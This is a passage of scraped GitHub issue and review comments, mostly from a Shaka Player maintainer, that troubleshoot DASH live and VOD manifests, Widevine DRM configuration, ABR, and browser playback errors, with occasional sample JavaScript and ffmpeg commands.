on Linux):\n- Open isoviewer and then open the initialization segment of either your 720p or 1080p stream.\n- Navigate to /moov[0]/trak[0]/mdia[0]/minf[0]/stbl[0]/stsd[0]/encv[0]/avcC[0]\n- Scroll down to SPS[1] and note the values of each frame_crop_*_offset field.\n- Navigate to /moov[0]/trak[0]/mdia[0]/minf[0]/stbl[0]/stsd[0]/encv[0] and note the values of width and height.\n- The following should hold true:\n  - IF 16 divides width\n    - THEN frame_crop_left_offset == 0 AND frame_crop_right_offset == 0\n    - ELSE frame_crop_left_offset != 0 OR frame_crop_right_offset != 0\n- And the similar condition that involves height should also hold true.\nLet me know what you find.\n. Thanks for checking. It looks like the encoder/packager is computing the correct values.\nTo try and get an error message you can try the following:\n- Start a fresh instance of Chrome and then navigate to chrome://media-internals, you should see nothing listed under Players.\n- Open another tab and navigate to the Shaka demo page or to your own application.\n- Start playback, you should see one player listed on chrome://media-internals.\n- Check the Log section for any errors.\n. Are you using version 5.x or master? It looks like one of the keys is not valid. In version 5.x or master you should see either an error message or something like Key status: 0123 4567 89ab cdef 0123 4567 89ab cdef: internal-error if you enable debug logging.\nYou can set a breakpoint here to check the key statuses in session.keyStatuses. You can also install EmeLogger to ensure UpdateSession() is not returning any errors.\n. We changed our implementation of @startNumber with SegmentTemplate to make it consistent with SegmentTimeline and SegmentList.\nIf you want playback to start from the beginning of your content then @startNumber should equal 1 and dash_1080.1.m4s, dash_480.1.m4s, etc., should be the first segments.\n. Hi,\nIf you start to package and then start to play shortly after, the player should only be behind 1 segment duration + MPD@minBufferTime (for SegmentTimeline style manifest, which is what edash-packager uses). So, usually just a couple segments (unless your MPD@minBufferTime is quite large).\nWhat is your exact use case? E.g., Starting to package and then starting to play right away? Or starting to package and then starting to play after several minutes or hours?\n. Hi,\nThis means that based on @availabilityStartTime and the current time, the player did not expect the manifest to specify segments past the time 1362. You can generally ignore this warning when the two values indicated are close. This message is a little verbose, in Shaka 2 we will forego displaying a warning like this.\nDepending on what packager you are using, you may be able to add an @availabilityStartTime offset. For example, with edash-packager you can adjust the availability_time_offset option.\n. This seems like a decoder issue. What browser/browser-version are you using? What platform are you on?\nAlso, in your MPD file, is the initialization segment for 1280x800 different from the one for 320x200?\n. The Player doesn't actually feed any resolution information into the browser: the browser's decoder figures it out from the segments themselves. The code you linked to has to do with changing initialization segments between manifest updates for live streams; I don't think it's relevant to the issue.\nI believe one of two things is occurring:\n1. The initialization segments in the manifest are not correct. There should be a unique initialization segment for each Representation.\n2. There is an issue with the browser's decoder and/or the content.\nI'd like to rule out 1 first. Can you share your MPD file? If not, can you confirm if your MPD file uses <SegmentBase>, <SegmentList>, <SegmentTemplate>, or <SegmentTemplate> together with <SegmentTimeline>?\n. Both of these MPDs have only one Representation. What does the original MPD look like that has more than one Representation?\n. For protected content, you provide a callback to DashVideoSource that the library invokes each time it encounters a <ContentProtection> element in your manifest. Each time that callback is invoked you return a DrmInfo.Config object for that <ContentProtection> element. The DrmInfo objects inside EmeManager contain the information that your application should have provided itself, so you shouldn't really need to access them.\nSee https://shaka-player-demo.appspot.com/docs/tutorial-player.html, specifically the \"Protected Content\" section for an example.\n. I see. So you want to support both Widevine and Playready without your application explicitly choosing one, but you want to know which one the library chose? Is this right?\n. Well, there's no explicit mechanism at the moment. However, on Chrome the key system will be Widevine, and on IE the key system will be Playready; you could determine this via navigator.userAgent. Would that work as an interim solution while we look into what we might want to do for Shaka 2?\n. Good point. I'm going to bump this up to a v2.0.0 goal.\n. We are planning to complete this by the end of June.\n. To address one issue: your MPD@timeShiftBufferDepth is ~24 hours. This means the user can seek back ~24 hours in the live stream. Currently the Player will generate SegmentReferences for each ~10 second segment each time the MPD is updated (every 5 seconds), which may become a bottleneck. I suggest reducing your MPD@timeShiftBufferDepth if you don't really need ~24 hours of DVR. That being said, we can probably optimize the MPD update for this style of manifest (e.g., we can avoid creating SegmentReferences when we don't need to, instead of creating them and throwing away duplicates).\n. Hi, I am able to reproduce the issue on IE11 on Windows 10. I see that the content works on Chrome Linux and Chrome Windows. Also, I see that the default Wowza test asset works fine on IE11 too. Nothing obvious seems wrong, so I'll have to investigate further.\n. Hi,\n\n@availabilityStartTime seems to be inaccurate; some segments may not be available yet: currentPresentationTime 11.00600004196167 latestAvailableSegmentEndTime 549.754\n\nindicates that there is a discrepancy between where the Player thinks the live-edge of the stream is (based on MPD@availabilityStartTime) and the times within the SegmentTimeline(s). However, these discrepancies are usually tolerable by the player.\nIt looks like the seekable range has collapsed, so there could be a bad interaction between the aforementioned issue and a small MPD@timeShiftBufferDepth... Are you able to give the RTMP module a specific (larger) MPD@timeShiftBufferDepth?\n. currentPresentationTime is the amount of time that has passed since the live stream began (streaming/broadcasting), i.e., currentTime - MPD@availabilityStartTime.\nlatestAvailableSegmentEndTime is the time when the last segment specified in the SegmentTimeline ends. Typically this value should be <= currentPresentationTime (e.g., if a stream has been broadcasting for 60 seconds then no segment should end past 60 seconds).\nIf latestAvailableSegmentEndTime is greater than currentPresentationTime then the first segment in the live stream likely doesn't start at t=0. If this is the case then the manifest should specify SegmentTemplate@presentationTimeOffset. For example, if the first segment starts at t=20s then @presentationTimeOffset should equal 20s. This lets the player know that it should offset every segment by -20s to align the segments to the start of the Period.\nAnother method to align the segments (which is the method that many packagers use) is to offset MPD@availabilityStartTime. For example, if you begin streaming at 11:00:00 and the first segment starts at t=20s then you can set MPD@availabilityStartTime to 10:59:40. By doing this the player will compute currentPresentationTime=20 right away and end up doing the right thing.\nIn Shaka v1 we try to handle a number of corner cases related to this stuff and the resulting logic is fairly tricky, we hope that our implementation in Shaka v2 simplifies things.\n\nSetting different values from timeShiftBufferDepth seems to affect the delay between live head and play head. What's a good approach to minimize this delay?\n\ntimeShiftBufferDepth shouldn't affect how close the player starts to the live-edge. However, the player does have to do a little more work at startup for larger timeShiftBufferDepth values... we had a performance regression in v1.6.3 that perhaps could be the culprit, how does v1.6.4 work?\nMoreover, MPD@minBufferTime will affect how close the player starts to the live-edge: the smaller the value, the closer you'll get.\nEDIT: Note that timeShiftBufferDepth=0 should work (it means that at least one segment is available IIRC from the spec.). I will have to investigate why it isn't working.\n. Typically MPD@availabilityStartTime remains fixed. The player determines which segments are available based upon currentTime and timeShiftBufferDepth. So, all the packager has to do is add more S elements to the SegmentTimeline each time the MPD is updated.\nAlthough, after reviewing DASH IOP section 4.4.3.3 (starting at line 12) I see that updating MPD@availabilityStartTime is valid so long as a number of other attributes are updated as well (including @presentationTimeOffset).\nHowever, from what I've seen this approach is not typical, and we don't directly support it. Does the nginx module have some sort of option to fix MPD@availabilityStartTime?\nWe would like to avoid directly supporting MPD@availabilityStartTime updates in Shaka v1, but we can consider it for Shaka v2 based on demand. I can also walk you through some possible changes you can make in v1 to make AST updates work (better) if you are unable to configure or modify the nginx module suitably.\n. > I think the primary concern is to blow up manifest size for very long streams with very small segment durations.\nWell, normally packagers just drop the S elements that are outside of the time shift buffer. For example, the first MPD might specify segments 1 through 10, and the second MPD might specify segments 4 through 14. This can be done without changing AST.\n\nAlso not sure what section 4.4.3.3 is referencing when it talks about \"S values\"\n\nYes, these would be the S elements in the SegmentTimeline(s). These values need to be relative to the start of the Period... So, if you're updating AST and Period@start then the S elements need to change so they're relative to the new Period@start.\nSo, to confirm, with a larger timeShiftBufferDepth value, are you able to playback the stream normally (except for the warning messages)?\n. > So dropping segment elements from the SegmentTimeline is possible, while keeping availabilityStartTime at it's original value?\nThat's right.\n\nI changed the RTMP module to do that, and it looks like this fixed the warning messages too.\n\nGreat. Yeah it seems like the nginx module is doing the kind of update that Shaka expects except for the AST updating part. So, just keeping AST constant seems like the right fix.\nAlright, I'll keep this issue open now to track the timeShiftBufferDepth=0 issue.\n. Since we're closing in on v2.0 we're going to avoid making any changes to v1.0 to support @timeShiftBufferDepth=0. I'll file a new bug against v2.0 for this.\n. It looks like the license does not contain the correct keys for the content. Which license server are you using?\n. It looks like the license does not contain the correct keys for the content. Which license server are you using?\n. That URL is for obtaining encryption keys to encrypt content. Are you running your own Widevine proxy server? If not, you probably want to use http://widevine-proxy.appspot.com/proxy as the license server, e.g.,\njavascript\nplayer.configure({\n  drm: {\n    servers: { 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy' }\n  }\n});\nDoes that help?\n. Thank you for the detailed report. I can reproduce the issue. Which packager are you using to create the content?\n. It appears that this is either a content issue, a decoder issue, or both. This may be a bug within the Chrome CDM (also see #304). The Chrome CDM team is investigating.\n. Live presentations generally require custom UI controls (to display the seekable time-range). We have not implemented these in the demo application yet.\n. It's because the SegmentTimeline ends at 302.0666...:\n(6000 / 90000) + (180000 / 90000)*151 = 302.0666...\n. Hi, is this still an issue for you?\n. The SegmentTimeline does not provide segments within the timeshift buffer window.\nFor example, MPD@availabilityStartTime =\n2016-04-14T16:27:15Z and now = 1460655041717 give a presentation time of approximately 3807 seconds. However, the first segment specified in the video AdaptationSet has a start time of 1460654972 seconds with no @presentationTimeOffset. Shaka v1 can play this content because it fudges the presentation time to match the SegmentTimeline. AFAICT this content is broken.\n. Hi, we just landed d2a812cd9849a891c62ad51393a1d969d883638f, which changes some of the internal streaming logic. Can you try again from master?\n. Great, thanks for testing. We'll take a look at those remaining issues. \n. I'm having a bit of trouble reproducing the issue. Does it only occur on Windows 8.1? Should I just keep clicking randomly around the seek bar until the error occurs? Which piece of default content can you reproduce with? Thanks.\n. Yes, I see the DOMException error now; it certainly looks like a browser issue. I've also determined that the assertion failure is a false-positive: if a user seeks while a segment is being appended and then again immediately after that segment is appended (but before another segment is fetched), waitingToClearBuffer will be true and performingUpdate will be false. So, that assertion is invalid. We'll have a patch up shortly to just remove that assertion.\n. We have completely done away with the timestamp correction mechanism in Shaka v2. What type of behavior do you see from the master branch?\n. Hi, any luck with Shaka v2?\n. Thanks for the report. We'll take a look.\n. If playback starts near the end of the video, the MPD file must be specifying a live presentation.\nCan you share your MPD file?\n. So, for VOD (static) content, your MPD file should not specify MPD@availabilityStartTime or MPD@timeShiftBufferDepth (unfortunately the player cannot rely on the MPD's type to determine if a presentation is VOD or live).\nWe also found an issue with the player: the player was treating certain content as partially VOD and partially live in the demo UI. We'll have patches up soon to correct this issue.\nHowever, you will still need to remove MPD@timeShiftBufferDepth from your MPD file since it specifies VOD content.\n. From the compiled library you will not see SEGMENT_DOES_NOT_EXIST or Assertion failed: ... errors logged; however, you should definitely see SEGMENT_DOES_NOT_EXIST errors dispatched (from the beta version).\nWe recently landed d2a812c, which changes some of the internal streaming logic. What type of behavior do you see from master?\n. Hi, we pushed a change to fix #348. Does that resolve the issue? Do you still see different behavior between compiled/uncompiled? Thanks.\n. Hi,\nWith 48.0a1 (2016-04-18) and media.webm.enabled=true, \"Angel One\" begins playback (although there seems to be some other issue (perhaps MSE related) that causes playback to stall). Which piece of content are you having trouble with?\n. Thanks @cpeterso \n. Yes, I see the problem. We'll look into reworking our support reporting system to handle this scenario.\n. Hi,\nEmeManager has been replaced by DrmEngine in Shaka v2. However, we have not integrated offline support into Shaka v2 yet. We will support DRM configuration for persistent licenses through player.configure() (see DRM tutorial and Advanced DRM Configuration) and add new APIs for storing and loading.\n. Desktop Chrome does not support persistent licenses at this time.\nError 6001 means the key system is not available for your content.\nDoes your MPD file specify Widevine protection?\nIf so, and you are on Windows, please check that \"WidevineCdm\" is listed at chrome://components.\n. > Desktop Chrome does not support persistent licenses at this time.\nMeans Widevine on desktop Chrome does not support persistent licenses at this time.\nShaka v2 will eventually provide APIs to use persistent licenses.\nAre you still having difficulties with player.configure()?\nAre you able to play \"Sintel 4K (multicodec, widevine)\" from the demo page?\nAre you able to play protected content if you use the default player configuration?\n. I'm having trouble reproducing the issue. What happens if you add\nconfig.drm.advanced = {\n  'com.widevine.alpha': {\n    'persistentStateRequired': false\n  }\n};\nright before https://github.com/google/shaka-player/blob/master/demo/asset_section.js#L150 ?\n. The following works for me on Chrome Linux 50.0.2661.75 and Chrome Linux 51.0.2704.7 with or without \"advanced\" settings using the master branch.\napp.html:\nhtml\n<!DOCTYPE html>\n<html>\n  <head>\n    <script src=\"shaka/third_party/closure/goog/base.js\"></script>\n    <script src=\"shaka/dist/deps.js\"></script>\n    <script src=\"shaka/shaka-player.uncompiled.js\"></script>\n    <script src=\"app.js\"></script>\n  </head>\n  <body>\n    <video id=\"video\" width=\"640\" controls autoplay></video>\n  </body>\n</html>\napp.js:\n``` javascript\nvar manifestUri = '//storage.googleapis.com/shaka-demo-assets/sintel-widevine/dash.mpd';\nfunction initApp() {\n  shaka.polyfill.installAll();\n  shaka.Player.support().then(function(support) {\n    if (support.supported) {\n      initPlayer();\n    } else {\n      alert('Browser not supported!');\n    }\n  });\n}\nfunction initPlayer() {\n  shaka.log.setLevel(shaka.log.Level.V1);\nvar video = document.getElementById('video');\n  var player = new shaka.Player(video);\nwindow.player = player;\n  player.addEventListener('error', onErrorEvent);    \nplayer.configure({\n    drm: {\n      servers: { 'com.widevine.alpha': '//widevine-proxy.appspot.com/proxy' },\n      advanced: {\n        'com.widevine.alpha': {\n          'persistentStateRequired': true\n        }\n      }\n    }\n  });\nplayer.load(manifestUri).then(function() {\n    console.info('Manifest loaded!');\n  }).catch(onError);\n}\nfunction onErrorEvent(event) { onError(event.detail); }\nfunction onError(error) { console.error(error); }\ndocument.addEventListener('DOMContentLoaded', initApp);\n```\nDoes this work? If not, which version of Chrome are you using? What does shaka/support.html say? What log messages do you get in the console after trying the above?\n. Persistent licenses on desktop Chrome is a desirable feature; however, I can't give you any expectations of when it would be implemented.\n. Good to hear that that code works. I'll leave this issue open to track progress for offline support.\n. - Widevine on desktop Chrome does not support persistent licenses, specifically it does not support persistent-usage-record or persistent-license MediaKeySessionTypes.\n- Shaka v2 does not provide offline support yet (i.e., APIs to use persistent licenses and to store/load content). \n- Shaka v1 does provide offline support.\nWe will implement offline support in Shaka v2, but keep in mind that offline support (as defined above) is implemented at the JavaScript level; it is separate from persistent license support, which is implemented at the browser/key-system level.\n. Yes, I believe we will need to include this API again.\n. Everything planned for v2 is in the v2.0.0 milestone: https://github.com/google/shaka-player/milestones/v2.0.0. v2 should have feature parity with v1 sans offline.\nWe will also push some more beta versions before then to appspot.\n. Hi,\nShaka v2 does use the UTCTiming element for clock synchronization; however, it only does so after it fetches the MPD for the first time. I'll mark this as an enhancement for now, and we'll discuss internally what our options are for clock synchronization throughout playback.\n. > ... but if we have incorrect time while loading page with player, shaka throws error just after first mpd loaded.\nWe should be correcting the time after the first MPD is loaded, so it sounds like there might be another issue here. We'll investigate.\n. Shaka v2 interacts with the MSE APIs a little differently than v1 does, so that could be the source of the problem. If you go to chrome://media-internals after the error occurs, do you see anything interesting?\n. Shaka v2 interacts with the MSE APIs a little differently than v1 does, so that could be the source of the problem. If you go to chrome://media-internals after the error occurs, do you see anything interesting?\n. Thanks for collecting those log messages. Which version of Chrome are you using? Do you get the same error from Chrome Canary? Can you share a link to your test content? (You can send me a private message if you don't want to post a link in public.)\n. > That looks like a timestamp to me. Is there any way that can be parsed out using Javascript, I wonder?\nUnfortunately there's no easy way to pull timestamps out of media segments without actually parsing the media segments (in JavaScript).\n\nI may be being completely dim, here, but I can't see how to send a PM.\n\nAh, I just meant an email. My contact info is in the CONTRIBUTORS file.\n. This issue arises from the way in which Chromium handles certain overlapping time ranges. Resolving this issue will require a change in Chromium and a small change in Shaka.\n. By timestamps in a live stream, do you mean the actual timestamps in the media segments? We have tentatively planned to support EMSG boxes (#259); the work required to address #259 could be used as a starting point for implementing more general box parsing. Or, perhaps there's a simpler solution: do you just need the player to output the position of the live-edge? Or the start time of the last segment inserted?\n. By timestamps in a live stream, do you mean the actual timestamps in the media segments? We have tentatively planned to support EMSG boxes (#259); the work required to address #259 could be used as a starting point for implementing more general box parsing. Or, perhaps there's a simpler solution: do you just need the player to output the position of the live-edge? Or the start time of the last segment inserted?\n. By timestamps in a live stream, do you mean the actual timestamps in the media segments? We have tentatively planned to support EMSG boxes (#259); the work required to address #259 could be used as a starting point for implementing more general box parsing. Or, perhaps there's a simpler solution: do you just need the player to output the position of the live-edge? Or the start time of the last segment inserted?\n. I'll add this as a separate, potential enhancement for v2+.\n. I'll add this as a separate, potential enhancement for v2+.\n. Yes, v2 currently requires VOD content to start near t=0; however, it seems like we'll have to change this behavior. See #341 for example.\n. Yes, v2 currently requires VOD content to start near t=0; however, it seems like we'll have to change this behavior. See #341 for example.\n. > What is the expected tolerance if t is not exactly equal to 0, with the current implementation?\nThe current tolerance is 1/15 of a second.\nWe will implement a new solution to handle content whose first segments don't start at t=0. We'll use this issue to track progress.\nThere are a few issues with #339: @minimumUpdatePeriod is 0, the last SegmentReference isn't being merged correctly while updating due to some rounding errors, and the default @suggestedPresentationDelay isn't large enough. We'll have a patch up for #339 sometime soon.\n. > What is the expected tolerance if t is not exactly equal to 0, with the current implementation?\nThe current tolerance is 1/15 of a second.\nWe will implement a new solution to handle content whose first segments don't start at t=0. We'll use this issue to track progress.\nThere are a few issues with #339: @minimumUpdatePeriod is 0, the last SegmentReference isn't being merged correctly while updating due to some rounding errors, and the default @suggestedPresentationDelay isn't large enough. We'll have a patch up for #339 sometime soon.\n. Hi, we do have plans to expose which key system is being used by the player (see #272); however, we have not decided on the APIs yet.\n. Hi, we do have plans to expose which key system is being used by the player (see #272); however, we have not decided on the APIs yet.\n. Yes, this is WAI: when you explicitly select a video track, the transition will not be seamless.\n. Yes, this is WAI: when you explicitly select a video track, the transition will not be seamless.\n. Can you try from master with verbose logging enabled?\n. Can you try from master with verbose logging enabled?\n. You can either call shaka.log.setLevel(shaka.log.Level.V2) from your application or you can add ?vv onto the end of your demo page, e.g., http://localhost/shaka/demo/?vv. Note that in both cases you need to be using the uncompiled library.\n. You can either call shaka.log.setLevel(shaka.log.Level.V2) from your application or you can add ?vv onto the end of your demo page, e.g., http://localhost/shaka/demo/?vv. Note that in both cases you need to be using the uncompiled library.\n. Hi, any updates on this? Working / not working from master?\n. Hi, any updates on this? Working / not working from master?\n. With 294bcca4e977bbee944c808fa705f921a5853c03 you should be able to use\nffmpeg -i <live-stream> -f dash manifest.mpd\nand\nffmpeg -i <live-stream> -x264opts 'keyint=25:scenecut=-1' -f dash manifest.mpd\nin dynamic mode (Shaka should automatically switch to static mode after the final manifest update as well).\nHowever, using -use_template false or -use_timeline false may not work in dynamic mode. This is because when using these options ffmpeg may vary the segment duration (i.e., it may vary SegmentList@duration and SegmentTemplate@duration) between manifest updates; this is rather unusual and likely not spec compliant (although when ffmpeg does this it outputs warnings indicating that SegmentTimeline should be used).\n(Also, be sure to delete the old manifest before re-starting ffmpeg as ffmpeg doesn't overwrite the manifest right away.)\n. With 294bcca4e977bbee944c808fa705f921a5853c03 you should be able to use\nffmpeg -i <live-stream> -f dash manifest.mpd\nand\nffmpeg -i <live-stream> -x264opts 'keyint=25:scenecut=-1' -f dash manifest.mpd\nin dynamic mode (Shaka should automatically switch to static mode after the final manifest update as well).\nHowever, using -use_template false or -use_timeline false may not work in dynamic mode. This is because when using these options ffmpeg may vary the segment duration (i.e., it may vary SegmentList@duration and SegmentTemplate@duration) between manifest updates; this is rather unusual and likely not spec compliant (although when ffmpeg does this it outputs warnings indicating that SegmentTimeline should be used).\n(Also, be sure to delete the old manifest before re-starting ffmpeg as ffmpeg doesn't overwrite the manifest right away.)\n. Yes, the player supports segmented WebM. However, you must provide the player with a DASH manifest file (i.e., an MPD file). You can create an MPD file from a segmented WebM file using ffmpeg, see http://wiki.webmproject.org/adaptive-streaming/instructions-to-playback-adaptive-webm-using-dash.\n. The MPD file specifies the segments' locations.\nNormally, a fragmented WebM file is split into an index segment (which contains <Cues> data), an initialization segment, and several media segments. The MPD file specifies the URIs of each segment if the segments are split into multiple files, or the byte ranges of each segment if the segments are in one file. lib/media/webm_segment_index_parser.js parses the index segment and initialization segment.\nIf you want to fragment a WebM file on the fly and feed it into the player you will also need to generate a DASH manifest on the fly and feed it into the player too.\n. Hi, with 058004eb021e626ebeb73eee13d9b8be3e376712 you can re-configure the player with a new AbrManager.\njavascript\nplayer.configure({\n  abr: { manager: new shaka.abr.SimpleAbrManager() }\n});\nThis will reset all bandwidth estimations.\n. You can use player.seekRange().end. This will give you the effective live-edge in seconds. However, this value will be a number of seconds less than just now - MPD@availabilityStartTime. Does that work?\n. If you just need the playhead position then you should use video.currentTime; it will correspond to the position in the live stream.\n. Ah, got it. We could add an API for that. You could also try\njavascript\nvar timeBehindLiveEdge = player.seekRange().end - video.currentTime;\nvar streamPosition = (Date.now() / 1000) - timeBehindLiveEdge;\nalthough, since player.seekRange().end is offset a little from the true live-edge, it may not work exactly how you want (seekRange() available from the master branch).\n. > Why don't you export the manifest?\nModifications to the manifest by the application could have many unintended consequences.\n\nvar playHeadDate = new Date(player.manifest_.presentationTimeline.presentationStartTime_*1000 + videoElm.currentTime*1000)\n\nWe could provide an equivalent API for this.\n. Hi, the issue is the same as #348 (also see #341). We will have a patch up soon.\n. Hi, we pushed a change to fix #348. Please let us know if that resolves the issue. Thanks.\n. Hi, you can configure Shaka v2 to use license server URLs specified in the manifest, and to use arbitrary query parameters in outbound license requests, as well as parse any inbound license responses.\nFor example, see https://github.com/google/shaka-player/blob/77a987e8e0183c89864474af43c79a6f44543519/demo/assets.js#L208\nwhich parses\nxml\n<ContentProtection schemeIdUri=\"http://youtube.com/drm/2012/10/10\">\n  <yt:SystemURL type=\"clearkey\">url1</yt:SystemURL>\n  <yt:SystemURL type=\"playready\">url2</yt:SystemURL>\n  <yt:SystemURL type=\"widevine\">url3</yt:SystemURL>\n</ContentProtection>\nto set multiple license server URLs. This hook is set via\njavascript\nplayer.configure({\n  manifest: { dash: { customScheme: shakaAssets.YouTubeCallback } }\n});\nYou can use the same mechanism to set the PlayReady license server URL in your application. Also, see the DRM tutorial.\nYou can then use a network request filter to set query parameters, for example,\njavascript\nplayer.getNetworkingEngine().registerRequestFilter(function(type, request) {\n    if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n      request.headers['auth_token'] = 'my_token';\n    }\n  });\nand a network response filter to pull out any data you need in your application, for example,\njavascript\nplayer.getNetworkingEngine().registerResponseFilter(function(type, request) {\n    if (type == shaka.net.NetworkingEngine.RequestType.LICENSE) {\n      app.appData = response.headers['app_data'];\n    }\n  });\nAlso, see the license server authentication tutorial.\nHope that helps. Let us know how it goes.\n. Hi, thanks for the report. We'll take a look.\n. Thanks for the report. We'll take a look.\n. With fe9189e, the player will still require text Representations to specify their content type, but it will not fail playback if they do not.\n. It could be a caching issue. What exact sequence of events are you following? E.g.,\n1. player.load('manifest.mpd');\n2. Pause video\n3. Change manifest.mpd\n4. player.load('manifest.mpd'); ?\nDoes disabling the browser's cache work? (Network tab in Developer tools.)\nOr do you mean that after calling player.load('manifest1.mpd') and then player.load('manifest2.mpd'), Shaka keeps fetching manifest1.mpd?\n. Ah, good catch. I see the problem in player.js now.\n. Thanks for the report. I can reproduce this issue. We'll take a look. Maybe related #369?\n. Hi, since be09f52 I no longer see this problem as before. Are you still seeing this error from master?\n. This seems to have been fixed by be09f52.\n. Hi, which version do you get when you run npm install shaka-player?\nYou can specify v1.6.5 specifically with npm install shaka-player@1.6.5.\n. Hi,\nShaka starts playback as soon as it has downloaded and inserted the init segment and first media segment of each initial Stream chosen (e.g., middle bitrate audio and low bitrate video), regardless of the buffering goals. After it downloads these segments, it will fetch the init segments of each <Representation> in the manifest in the background. However, multiple media segments could be downloaded before playback begins, since there will always be some delay between when Shaka inserts media segments and when the video element begins playback.\nTo help rule some things out, can you enable verbose logging and add\njavascript\nvideo.addEventListener('playing', function() { console.log('PLAY'); });\nvideo.addEventListener('loadedmetadata', function() { console.log('LOADED_METADATA'); });\nbefore loading the manifest and check how many fetchAndAppend_ calls there are before \"PLAY\" is logged?\n. Yes, there is a gap, but it's actually in the SIDX of the second Period. The SIDX indicates that the first segment of the second Period begins at ~ 0.4 seconds (as it specifies an earliestPresentationTime); however, the actual segment begins at 0. I believe the SIDX may be incorrect here.\n. Hi, apart from missing a UTCTiming element, it looks availabilityStartTime is incorrect.\nIn general, the t= values in each SegmentTimeline (after dividing by timescale) should be around now - availabilityStartTime. This can be accomplished by setting availabilityStartTime to the publish time of the very first MPD (so long as the first timestamp in the first segment is 0).\n. Yes, we should do this.\n. Thanks for the report.\n\nIf I were going to guess, maybe the time codes for every segment in the timeline are re-computed every time the manifest is updated?\n\nEvery segment specified in the new manifest is parsed into a SegmentReference, then after that, all those SegmentReferences are merged into the existing indexes. There are definitely some optimization opportunities, e.g., we could skip parsing segments that we know we have existing SegmentReferences for.\nWe'll discuss internally on what we can do here.\n. Hi, if you want to modify the player's adaptive bitrate logic, you can provide your own AbrManager instance via Player's configure() method. So I suggest that you just copy SimpleAbrManager and then modify STARTUP_INTERVAL_MS and SWITCH_INTERVAL_MS in your version.\nIf tweaking SimpleAbrManager's parameters become a common use case, we can consider making SimpleAbrManager customizable; but for now, using a custom AbrManager instance is the only mechanism to implement custom ABR logic.\n. Hi, you can listen to events directly from the video element:\njavascript\nvideo.addEventListener('playing', onPlaying);\nvideo.addEventListener('pause', onPause);\nvideo.addEventListener('ended', onEnded);\nTo save playback position you can save video.currentTime in your application.\nThe next time you start playback you can pass that time to load(), e.g.,\njavascript\nvar player = new shaka.Player(video);\nplayer.load(manifestUri, lastPlaybackPosition);\n. > I think the right solution might be to add an isLive() check to fitSegmentReferences that uses timeShiftBufferDepth instead of periodDuration as a proxy to live.\nYes, fitSegmentReferences() should only extend the last segment for VOD... It's \"live check\" should be similar to PresentationTimeline.isLive().\n.  Yes, a PR would be great. Thanks.\n. @baconz Looks good to me.\n. lgtm\n. I'm not totally clear why this is necessary: is the issue that your in-progress VOD is being treated as live with regards to seeking, but you want it to be treated like VOD?\n. Apologies for the delay. I had some initial concern about how this change would interact with live content with a duration and an actual moving segment availability window; however, I don't think that use case is being exercised, so let's move forward with this. \n. lgtm\n. 80 char limit.\n. \"expose\" can be dropped here since this method won't be called by the application.\n. Assert that |videoSource_| is non-null or bail if it is null.\n. Perhaps just change |videoSource_| to |videoSource| (i.e., make it protected)?\n. 80 char limit.\n. 80 char limit.\n. Suggest renaming |segmentIndex| to |index| or just |i| as we use |segmentIndex| elsewhere to refer to ISegmentIndex instances.\n. 80 char limit.\n. 80 char limit.\n. Please assert somewhere that |opt_clearBufferOffset|, if set, is non-negative as a sanity check.\n. nit: formatting.\n. 80 char limit.\n. 80 char limit.\n. Please update the type in the constructor too.\n. Please use |clearBufferOffset| as the property name.\n. typo: double \"the\".\n. Suggest that you also assert that r2.endTime > r1.endTime.\n. I think you need to pass in both |periodDuration| and |segmentAvailabilityDuration| instead of |presentationTimeline| because |presentationTimeline| is not fully initialized here when the first manifest is parsed (see parsePeriods_() callsite in parseManifest_())... alternatively, |presentationTimeline| could be initialized beforehand by refactoring parsePeriods_() a bit, but I think the former solution is okay.\n. nit: should this just be \"uses duration for vod\"?\n. ",
    "johnluther": "Hi, @joeyparrish. I was able to access the corrigendum document for free here.\nThe ISO doc repository is a bit confusing, so here are the repro steps: \n1. Go to the main DASH spec page.\n2. Click the Corrigenda/Amendments tab.\n3. Click the \"ISO/IEC 23009-1:2014/Cor 1:2015\" link.\n4. Click the \"Preview ISO/IEC 23009-1:2014/Cor 1:2015\" button.\nThe text that @barbibulle refers to is on page 22.\nCan we get this implemented now? A customer of ours has come across the issue and it is blocking them b/c their video encoding provider always sets the startNumber == 0.\nThanks--\nJL\n. Sorry, @FrankGalligan , I moved those files around while testing. I moved them back, please try again.\nJL\n. I think there might be a bug in Chrome with odd (i.e., not divisible by 2) frame sizes in WebM w/ DASH. \nI made two sets of files. The only difference between them is that one was encoded with the FFmpeg scaling filter set to \"-1\" for width, and the other was set to \"-2.\" (The \"-1\" scales proportionally but sometimes results in widths that are not divisible by 2. The \"-2\" always forces a size that is divisible by two.)\nThis set (-1) produces the error: http://demo.jwplayer.com/jluther/shaka-odd.html \nThis set (-2) does not: http://demo.jwplayer.com/jluther/shaka-even.html\nJL\n. @joeyparrish, I was going to file it, but it looks like it was reported last month & the team is looking into it:\nhttps://code.google.com/p/chromium/issues/detail?id=505070&q=odd%20size&colspec=ID%20Pri%20M%20Stars%20ReleaseBlock%20Cr%20Status%20Owner%20Summary%20OS%20Modified\nI'll add my info as another test case.\nJL\n. Here is the console output from Edge:\n```\nSCRIPT5: Access is denied.\nhttp_plugin.js (38,5)\nWrong error type!\nPlayer error Error: Access is denied.\nmain.js (147,3)\n   \"Player error\"\n   {\n      [functions]: ,\n      proto: {\n         [functions]: ,\n         proto: { },\n         message: \"\",\n         name: \"Error\"\n      },\n      description: \"Access is denied.\",\n      message: \"Access is denied.\",\n      name: \"Error\",\n      number: -2147024891,\n      stack: \"Error: Access is denied.\n   at Anonymous function (https://shaka-player-demo.appspot.com/lib/net/http_plugin.js:38:5)\n   at Promise (native code)\n   at shaka.net.HttpPlugin (https://shaka-player-demo.appspot.com/lib/net/http_plugin.js:35:3)\n   at shaka.net.NetworkingEngine.prototype.send_ (https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:364:3)\n   at shaka.net.NetworkingEngine.prototype.request (https://shaka-player-demo.appspot.com/lib/net/networking_engine.js:302:3)\n   at shaka.dash.DashParser.prototype.requestManifest_ (https://shaka-player-demo.appspot.com/lib/dash/dash_parser.js:341:3)\n   at shaka.dash.DashParser.prototype.start (https://shaka-player-demo.appspot.com/lib/dash/dash_parser.js:303:3)\n   at Anonymous function (https://shaka-player-demo.appspot.com/lib/player.js:340:5)\"\n   }\n```\n. ",
    "tbaylet": "Joey. Thanks for feedback. Working fine with build.\n. ",
